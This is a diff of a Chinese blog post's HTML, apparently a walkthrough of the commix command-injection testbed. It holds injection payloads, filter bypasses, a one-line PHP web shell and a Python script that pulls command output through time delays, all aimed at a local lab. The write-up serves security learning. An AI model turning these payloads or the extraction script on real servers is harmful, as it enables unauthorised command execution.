@@ -1,600 +1,483 @@
-
 <!DOCTYPE html>
 <html lang="zh-cn">
-    
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hexo">
-    <title>commix-testbed - Hexo</title>
-    <meta name="author" content="John Doe">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
     
-    
-    
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\nClassic regular example没有过滤 直接分割一下，读flag 注意一下编码\npaylaod\n1;cat%20/flag %0acat%20/flag\n\nClassic (Base64) regular example输入之前的payload  提示\nPlease, encode your input to Base64 format.                \nbase64编码一下\n1;cat /flag  ==&gt; O2NhdCAvZmxhZw==\n\n拿到flag\nClassic (Hex) regular example16进制编码一下\n1;cat /flag  ==&gt;  0x3b636174202f666c6167\n\n去掉前面的0x，提交  \nClassic single-quote example直接用之前的payload 没显示，提交127.0.0.1 有回显\n看一下源码(关键部分)\n1echo exec(\"/bin/ping -c4 '\".$addr.\"'\");\n\n参数被单引号包住，闭合一下 \n1%27;cat%20/flag%27\n\nClassic double-quote example和前面不同的就是被双引号包住，闭合一下\n%22;cat%20/flag%22\nClassic non-space example过滤了空格 %0a等字符，利用${IFS}绕过\n1;cat$&#123;IFS&#125;/flag\n\nClassic blacklisting example做的这题的时候，网突然卡了，我还以为碰到了个大WAF，害的我跑去看源码，\n123456$blacklisting = array(  ';' =&gt; '',  '&amp;&amp;'=&gt; '',  '|' =&gt; '',  '`' =&gt; '' );\n\n黑名单，过滤了四个字符，没关系，分割符可以用%0a 等换行符表示\npaylaod\n1%0acat%20/flag\n\nClassic hashing example给了一串hash  ，去解密一下，一般是解密不出来的\n果然，没有破解出来  看一下前面的英语，string to hash 翻译一下 \n原来是把输入的字符串转为hash 输入一个试试 \n11 ==&gt; b026324c6904b2a9cb4b88d6d61c81d1\n\n有salt  命令注入还是头一次碰到这种情况，看一下源码\n1echo exec('echo '.$string.' | md5sum');\n\nmd5sum是Linux一个hash命令\n因为md5sum在exec的后面，可以利用换行符绕过\npayload \n1`cat%20/flag`%0a\n\nClassic example &amp; Basic HTTP Authentication弹出一个对话框，auth认证，输入一个弱密码 admin admin试试，竟然绕过了\n这里竟然啥都没过滤，直接截断，读文件\n1;cat+/flag\n\nBlind regular example盲注型的注入\ndnslog12\n\n延时注入需要几个命令 sed cut\nsed123456root@kali:~# ls | sed 1p1.txt1.txt22.pyroot@kali:~# ls | sed -n 1p1.txt\n\ncut123456root@kali:~# whoamirootroot@kali:~# whoami | cut -c 1rroot@kali:~# whoami|cut -c 1-2ro\n\n连起来用\n12root@kali:~# ls | sed -n 1p | cut -c 1-21.\n\ntime rcetest.php写入\n123&lt;?phpsystem($_GET[shell]);?&gt;\n\npayload\n1test.php?shell=if [ $(whoami|cut -c 1) = w ];then sleep 10;fi\n\n当猜对的时候 延时10s 猜错了 直接返回\n读文件可能有特殊字符，base32编码一下\n12&gt;&gt;&gt; base64.b32encode(b&apos;w&apos;)b&apos;O4======&apos;\n\npayload\n1test.php?shell=if [ $(whoami|base32|cut -c 1) = O ];then sleep 10;fi\n\nwc命令统计字节数\n1234p1k@ddd:/var/www/html$ whoami | wc      1       1       4p1k@ddd:/var/www/html$ whoami | wc -c4\n\n脚本\n123456789101112131415161718192021222324252627282930313233import base64import requestschars= &quot;QWERTYUIIOPASDFGHJKLZXCVBNM1234567890=&quot;def get_length(url,cmd,time):    data_length=&apos;&apos;    for i in range(1,10):        for k in range(0,10):            url1 = url + &apos;if [ $(&#123;0&#125;|base32|wc -c|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,i,k)            print(url1)            try:                res=requests.get(url=url1,timeout=time)            except:                print(k)                data_length += str(k)                break    return data_lengthdef get_content(url,cmd,time,length):    result=&apos;&apos;    for k in range(length):        for c in chars:            url1 = url + &apos;if [ $(&#123;0&#125;|base32|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,k,c)            try:                requests.get(url=url1,timeout=time)            except:                result += c                print(result)                break    return resultlength=int(get_length(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2))result=get_content(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2,length)print(base64.b32decode((result)))\n\n","dateCreated":"2019-09-19T15:51:10+08:00","dateModified":"2019-10-30T16:55:25+08:00","datePublished":"2019-09-19T15:51:10+08:00","description":"","headline":"commix-testbed","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/19/commix-testbed/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/19/commix-testbed/"}</script>
-    <meta name="description" content="Classic regular example没有过滤 直接分割一下，读flag 注意一下编码 paylaod 1;cat%20/flag %0acat%20/flag  Classic (Base64) regular example输入之前的payload  提示 Please, encode your input to Base64 format.                 bas">
-<meta property="og:type" content="blog">
-<meta property="og:title" content="commix-testbed">
-<meta property="og:url" content="http://p1keman.github.io/2019/09/19/commix-testbed/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Classic regular example没有过滤 直接分割一下，读flag 注意一下编码 paylaod 1;cat%20/flag %0acat%20/flag  Classic (Base64) regular example输入之前的payload  提示 Please, encode your input to Base64 format.                 bas">
-<meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2019-10-30T08:55:25.104Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="commix-testbed">
-<meta name="twitter:description" content="Classic regular example没有过滤 直接分割一下，读flag 注意一下编码 paylaod 1;cat%20/flag %0acat%20/flag  Classic (Base64) regular example输入之前的payload  提示 Please, encode your input to Base64 format.                 bas">
-    
-    
+    <title>
         
-    
-    
-    
-    
-    
-    <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
-    <!--STYLES END-->
-    
-
-    
-
-    
+            commix-testbed |
         
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
     
-</head>
-
-    <body>
-        <div id="blog">
-            <!-- Define author's picture -->
-
+<link rel="stylesheet" href="/css/style.css">
 
     
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
-<header id="header" data-behavior="4">
-    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
-    <div class="header-title">
-        <a
-            class="header-title-link"
-            href="/ "
-            aria-label=""
-        >
-            Hexo
-        </a>
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"SBJ is SB."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-        
-            <a
-                class="header-right-picture "
-                href="#about"
-                aria-label="打开链接: /#about"
-            >
-        
-        
-        </a>
-    
-</header>
 
-            <!-- Define author's picture -->
-
-
-<nav id="sidebar" data-behavior="4">
-    <div class="sidebar-container">
-        
-        
-            <ul class="sidebar-buttons">
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/"
-                            
-                            rel="noopener"
-                            title="首页"
-                        >
-                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">首页</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-categories"
-                            
-                            rel="noopener"
-                            title="分类"
-                        >
-                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">分类</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-tags"
-                            
-                            rel="noopener"
-                            title="标签"
-                        >
-                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">标签</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-archives"
-                            
-                            rel="noopener"
-                            title="归档"
-                        >
-                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">归档</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link open-algolia-search"
-                            href="#search"
-                            
-                            rel="noopener"
-                            title="搜索"
-                        >
-                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">搜索</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="#about"
-                            
-                            rel="noopener"
-                            title="关于"
-                        >
-                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
             
         </ul>
-        
     </div>
-</nav>
 
-            
-            <div id="main" data-behavior="4"
-                 class="
-                        hasCoverMetaIn
-                        ">
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
                 
-<article class="post">
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">commix-testbed</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2019-09-19 15:51:10
+    </span>
     
     
-        <div class="post-header main-content-wrap text-left">
-    
-        <h1 class="post-title">
-            commix-testbed
-        </h1>
+
     
     
-        <div class="post-meta">
-    <time datetime="2019-09-19T15:51:10+08:00">
-	
-		    9月 19, 2019
-    	
-    </time>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-    
-</div>
+                    </div>
+                </div>
+            </div>
+        
 
-    
-    <div class="post-content markdown">
-        <div class="main-content-wrap">
+        <div class="article-content markdown-body">
             <a id="more"></a>
 
 <h2 id="Classic-regular-example"><a href="#Classic-regular-example" class="headerlink" title="Classic regular example"></a>Classic regular example</h2><p>没有过滤 直接分割一下，读flag 注意一下编码</p>
 <p>paylaod</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat%20/flag %0acat%20/flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat%20&#x2F;flag %0acat%20&#x2F;flag</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="Classic-Base64-regular-example"><a href="#Classic-Base64-regular-example" class="headerlink" title="Classic (Base64) regular example"></a>Classic (Base64) regular example</h2><p>输入之前的payload  提示</p>
 <p><strong>Please, encode your input to Base64 format.</strong>                </p>
 <p>base64编码一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /flag  ==&gt; O2NhdCAvZmxhZw==</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat &#x2F;flag  &#x3D;&#x3D;&gt; O2NhdCAvZmxhZw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
 <p>拿到flag</p>
 <h2 id="Classic-Hex-regular-example"><a href="#Classic-Hex-regular-example" class="headerlink" title="Classic (Hex) regular example"></a>Classic (Hex) regular example</h2><p>16进制编码一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /flag  ==&gt;  0x3b636174202f666c6167</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat &#x2F;flag  &#x3D;&#x3D;&gt;  0x3b636174202f666c6167 </span><br></pre></td></tr></table></figure>
 <p>去掉前面的0x，提交  </p>
 <h2 id="Classic-single-quote-example"><a href="#Classic-single-quote-example" class="headerlink" title="Classic single-quote example"></a>Classic single-quote example</h2><p>直接用之前的payload 没显示，提交127.0.0.1 有回显</p>
 <p>看一下源码(关键部分)</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> exec(<span class="string">"/bin/ping -c4 '"</span>.$addr.<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;/bin/ping -c4 &#x27;&quot;</span>.<span class="variable">$addr</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
 <p>参数被单引号包住，闭合一下 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27;cat%20/flag%27</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27;cat%20&#x2F;flag%27</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="Classic-double-quote-example"><a href="#Classic-double-quote-example" class="headerlink" title="Classic double-quote example"></a>Classic double-quote example</h2><p>和前面不同的就是被双引号包住，闭合一下</p>
 <p>%22;cat%20/flag%22</p>
 <h2 id="Classic-non-space-example"><a href="#Classic-non-space-example" class="headerlink" title="Classic non-space example"></a>Classic non-space example</h2><p>过滤了空格 %0a等字符，利用${IFS}绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat$&#123;IFS&#125;/flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat$&#123;IFS&#125;&#x2F;flag</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="Classic-blacklisting-example"><a href="#Classic-blacklisting-example" class="headerlink" title="Classic blacklisting example"></a>Classic blacklisting example</h2><p>做的这题的时候，网突然卡了，我还以为碰到了个大WAF，害的我跑去看源码，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$blacklisting = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'&amp;&amp;'</span>=&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'`'</span> =&gt; <span class="string">''</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklisting</span> = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;&amp;&amp;&#x27;</span>=&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;|&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;`&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure>
 <p>黑名单，过滤了四个字符，没关系，分割符可以用%0a 等换行符表示</p>
 <p>paylaod</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0acat%20/flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0acat%20&#x2F;flag</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="Classic-hashing-example"><a href="#Classic-hashing-example" class="headerlink" title="Classic hashing example"></a>Classic hashing example</h2><p>给了一串hash  ，去解密一下，一般是解密不出来的</p>
 <p>果然，没有破解出来  看一下前面的英语，string to hash 翻译一下 </p>
 <p>原来是把输入的字符串转为hash 输入一个试试 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 ==&gt; b026324c6904b2a9cb4b88d6d61c81d1</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x3D;&#x3D;&gt; b026324c6904b2a9cb4b88d6d61c81d1</span><br></pre></td></tr></table></figure>
 <p>有salt  命令注入还是头一次碰到这种情况，看一下源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> exec(<span class="string">'echo '</span>.$string.<span class="string">' | md5sum'</span>);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> exec(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$string</span>.<span class="string">&#x27; | md5sum&#x27;</span>);</span><br></pre></td></tr></table></figure>
 <p>md5sum是Linux一个hash命令</p>
 <p>因为md5sum在exec的后面，可以利用换行符绕过</p>
 <p>payload </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat%20/flag`%0a</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;cat%20&#x2F;flag&#96;%0a</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="Classic-example-amp-Basic-HTTP-Authentication"><a href="#Classic-example-amp-Basic-HTTP-Authentication" class="headerlink" title="Classic example &amp; Basic HTTP Authentication"></a>Classic example &amp; Basic HTTP Authentication</h2><p>弹出一个对话框，auth认证，输入一个弱密码 admin admin试试，竟然绕过了</p>
 <p>这里竟然啥都没过滤，直接截断，读文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat+/flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat+&#x2F;flag</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="Blind-regular-example"><a href="#Blind-regular-example" class="headerlink" title="Blind regular example"></a>Blind regular example</h2><p>盲注型的注入</p>
-<h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
 
 <h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>需要几个命令 sed cut</p>
 <h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ls | sed 1p</span></span><br><span class="line">1.txt</span><br><span class="line">1.txt</span><br><span class="line">22.py</span><br><span class="line">root@kali:~<span class="comment"># ls | sed -n 1p</span></span><br><span class="line">1.txt</span><br></pre></td></tr></table></figure>
-
 <h4 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@kali:~<span class="comment"># whoami | cut -c 1</span></span><br><span class="line">r</span><br><span class="line">root@kali:~<span class="comment"># whoami|cut -c 1-2</span></span><br><span class="line">ro</span><br></pre></td></tr></table></figure>
-
 <p>连起来用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ls | sed -n 1p | cut -c 1-2</span></span><br><span class="line">1.</span><br></pre></td></tr></table></figure>
-
 <h4 id="time-rce"><a href="#time-rce" class="headerlink" title="time rce"></a>time rce</h4><p>test.php写入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system($_GET[shell]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="variable">$_GET</span>[shell]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?shell=if [ $(whoami|cut -c 1) = w ];then sleep 10;fi</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?shell&#x3D;if [ $(whoami|cut -c 1) &#x3D; w ];then sleep 10;fi</span><br></pre></td></tr></table></figure>
 <p>当猜对的时候 延时10s 猜错了 直接返回</p>
 <p>读文件可能有特殊字符，base32编码一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; base64.b32encode(b&apos;w&apos;)</span><br><span class="line">b&apos;O4======&apos;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; base64.b32encode(b&#39;w&#39;)</span><br><span class="line">b&#39;O4&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?shell=if [ $(whoami|base32|cut -c 1) = O ];then sleep 10;fi</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?shell&#x3D;if [ $(whoami|base32|cut -c 1) &#x3D; O ];then sleep 10;fi</span><br></pre></td></tr></table></figure>
+
 
 <h4 id="wc命令"><a href="#wc命令" class="headerlink" title="wc命令"></a>wc命令</h4><p>统计字节数</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:/var/www/html$ whoami | wc</span><br><span class="line">      1       1       4</span><br><span class="line">p1k@ddd:/var/www/html$ whoami | wc -c</span><br><span class="line">4</span><br></pre></td></tr></table></figure>
-
 <p>脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">chars= &quot;QWERTYUIIOPASDFGHJKLZXCVBNM1234567890=&quot;</span><br><span class="line"></span><br><span class="line">def get_length(url,cmd,time):</span><br><span class="line">    data_length=&apos;&apos;</span><br><span class="line">    for i in range(1,10):</span><br><span class="line">        for k in range(0,10):</span><br><span class="line">            url1 = url + &apos;if [ $(&#123;0&#125;|base32|wc -c|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,i,k)</span><br><span class="line">            print(url1)</span><br><span class="line">            try:</span><br><span class="line">                res=requests.get(url=url1,timeout=time)</span><br><span class="line">            except:</span><br><span class="line">                print(k)</span><br><span class="line">                data_length += str(k)</span><br><span class="line">                break</span><br><span class="line">    return data_length</span><br><span class="line">def get_content(url,cmd,time,length):</span><br><span class="line">    result=&apos;&apos;</span><br><span class="line">    for k in range(length):</span><br><span class="line">        for c in chars:</span><br><span class="line">            url1 = url + &apos;if [ $(&#123;0&#125;|base32|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,k,c)</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url=url1,timeout=time)</span><br><span class="line">            except:</span><br><span class="line">                result += c</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">    return result</span><br><span class="line">length=int(get_length(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2))</span><br><span class="line">result=get_content(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2,length)</span><br><span class="line">print(base64.b32decode((result)))</span><br></pre></td></tr></table></figure>
